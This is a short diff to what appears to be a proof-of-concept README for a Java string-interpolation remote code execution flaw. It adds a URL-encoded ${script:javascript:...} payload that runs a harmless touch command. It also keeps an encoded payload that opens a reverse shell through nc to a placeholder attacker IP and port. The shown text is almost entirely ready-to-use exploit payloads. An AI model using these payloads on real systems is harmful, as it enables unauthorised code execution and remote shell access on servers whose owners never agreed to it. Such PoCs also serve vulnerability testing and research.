@@ -35,7 +35,11 @@ You can use Docker to be able to run this PoC:
 ```
    ${script:javascript:java.lang.Runtime.getRuntime().exec'<Command to Execute>’)}
 ```
-3. Encoded payload for RCE
+3. Encoded Touch command for testing set-up
+```
+  %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D
+```
+4. Encoded payload for RCE
 ```
   %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20<Attacker's IP>%20<Attacker's port>%20-e%20%2Fbin%2Fbash%27%29%7D
 ```
